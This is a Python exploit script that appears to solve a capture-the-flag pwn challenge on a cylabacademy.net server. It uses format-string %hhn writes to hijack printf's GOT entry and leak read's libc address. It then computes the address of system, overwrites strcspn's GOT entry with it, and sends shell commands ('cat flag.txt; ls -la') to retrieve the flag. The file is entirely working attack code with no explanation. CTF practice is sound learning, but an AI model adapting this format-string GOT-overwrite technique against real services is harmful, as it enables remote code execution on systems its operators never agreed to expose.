import sys, socket, time, struct, re
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
HOST, PORT = "mars.cylabacademy.net", 31929
PRINTF_GOT = 0x601030
STRCSPN_GOT = 0x601060
READ_GOT = 0x601050
B_READ = 0x4008e8
READ_OFF = 0x111130
SYSTEM_OFF = 0x52290


def buildB(fmt_body, addrs):
    b = b"1" + fmt_body
    pad = (8 - (len(b) % 8)) % 8
    b += b"P" * pad
    off = len(b)
    for ad in addrs:
        b += struct.pack("<Q", ad)
    pos = [42 + (off // 8) + i for i in range(len(addrs))]
    return b, pos


def make_fmt(dst, value, leak_addr=None, c0=30, nbytes=6):
    vals = [((value >> (8 * i)) & 0xFF, i) for i in range(nbytes)]
    order = sorted(vals)
    addrs = [dst + off for v, off in order]
    if leak_addr is not None:
        addrs.append(leak_addr)
    pos = [42 + i for i in range(len(addrs))]
    for _ in range(10):
        fmt = b""
        cur = c0
        for i, (v, off) in enumerate(order):
            need = (v - cur) % 256
            if need == 0:
                need = 256
            cur += need
            fmt += b"%" + str(need).encode() + b"c%" + str(pos[i]).encode() + b"$hhn"
        if leak_addr is not None:
            fmt += b"%" + str(pos[len(order)]).encode() + b"$s"
        b, newpos = buildB(fmt, addrs)
        if newpos == pos:
            return b, newpos
        pos = newpos
    return b, pos


s = socket.create_connection((HOST, PORT), timeout=20)
s.settimeout(8)
time.sleep(0.3)
try:
    s.recv(4096)
except Exception:
    pass
b1, p1 = make_fmt(PRINTF_GOT, B_READ, leak_addr=READ_GOT, c0=30)
s.sendall(b"-1\n"); time.sleep(0.2)
s.sendall(b1 + b"\n"); time.sleep(1.2)
buf = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        buf += c
except Exception:
    pass
j = buf.find(b"PPPP")
read_addr = int.from_bytes(buf[j - 6:j] + b"\x00\x00", "little")
base = read_addr - READ_OFF
system = base + SYSTEM_OFF
print("leak:", hex(read_addr), "base:", hex(base), "system:", hex(system))
b2, p2 = make_fmt(STRCSPN_GOT, system, None, c0=30)
print("B2:", b2[:100])
s.sendall(b2 + b"\n"); time.sleep(1.0)
try:
    s.recv(1 << 16)
except Exception:
    pass
# passe finale : B = commande -> system(B)
s.sendall(b"cat flag.txt; cat flag*; ls -la\n"); time.sleep(2.5)
out = b""
try:
    while True:
        c = s.recv(1 << 16)
        if not c:
            break
        out += c
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SORTIE ===")
print(txt[-1500:])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("\nFLAG:", f.group(0) if f else "non trouve")
s.close()
